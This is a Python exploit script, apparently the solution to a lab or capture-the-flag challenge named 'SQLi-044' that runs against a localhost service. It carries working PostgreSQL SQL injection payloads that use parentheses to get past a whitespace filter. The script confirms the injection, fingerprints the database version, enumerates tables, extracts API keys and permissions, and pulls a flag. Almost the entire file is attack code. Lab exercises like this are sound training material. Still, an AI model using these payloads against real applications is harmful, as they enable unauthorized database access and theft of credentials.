#!/usr/bin/env python3
"""SQLi-044: PostgreSQL Whitespace Filter Bypass - Exploit Script"""

import requests
import sys

TARGET_URL = "http://localhost:5044/api/user"

def send_payload(payload):
    """Send payload and return response"""
    params = {"id": payload}
    try:
        r = requests.get(TARGET_URL, params=params, timeout=10)
        return r.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def extract_tables():
    """Extract table names using parentheses bypass"""
    print("[*] Extracting table names...")
    payload = "0)UNION(SELECT(1),(table_name),(3),(4)FROM(information_schema.tables)WHERE(table_schema)=('public'"
    response = send_payload(payload)
    
    if response:
        for table in ['users', 'api_keys', 'flags']:
            if table in response:
                print(f"    [+] Found table: {table}")

def extract_flag():
    """Extract flag from flags table"""
    print("[*] Extracting flag...")
    payload = "0)UNION(SELECT(1),(name),(value),(4)FROM(flags"
    response = send_payload(payload)
    
    if response and "FLAG{" in response:
        start = response.find("FLAG{")
        end = response.find("}", start) + 1
        flag = response[start:end]
        return flag
    return None

def extract_api_keys():
    """Extract admin API keys"""
    print("[*] Extracting API keys...")
    payload = "0)UNION(SELECT(1),(api_key),(permissions),(4)FROM(api_keys"
    response = send_payload(payload)
    if response:
        print(f"    [+] Response contains API key data")
    return response

def main():
    print("=" * 60)
    print("SQLi-044: PostgreSQL Whitespace Filter Bypass Exploit")
    print("=" * 60)
    print(f"\n[*] Target: {TARGET_URL}")
    print("[*] Bypass technique: Parentheses (no whitespace)\n")
    
    # Step 1: Test injection
    print("[1] Testing injection point...")
    response = send_payload("1)OR(1)=(1")
    if response and "john_doe" in response:
        print("    [+] Injection successful!")
    else:
        print("    [-] Injection failed")
        return
    
    # Step 2: Identify DBMS
    print("\n[2] Identifying DBMS...")
    response = send_payload("0)UNION(SELECT(1),(version()),(3),(4")
    if response and "PostgreSQL" in response:
        print("    [+] PostgreSQL detected")
    
    # Step 3: Extract tables
    print("\n[3] Enumerating tables...")
    extract_tables()
    
    # Step 4: Extract API keys
    print("\n[4] Extracting API keys...")
    extract_api_keys()
    
    # Step 5: Get flag
    print("\n[5] Getting flag...")
    flag = extract_flag()
    
    if flag:
        print("\n" + "=" * 60)
        print(f"[+] FLAG FOUND: {flag}")
        print("=" * 60)
    else:
        print("[-] Could not extract flag")

if __name__ == "__main__":
    main()
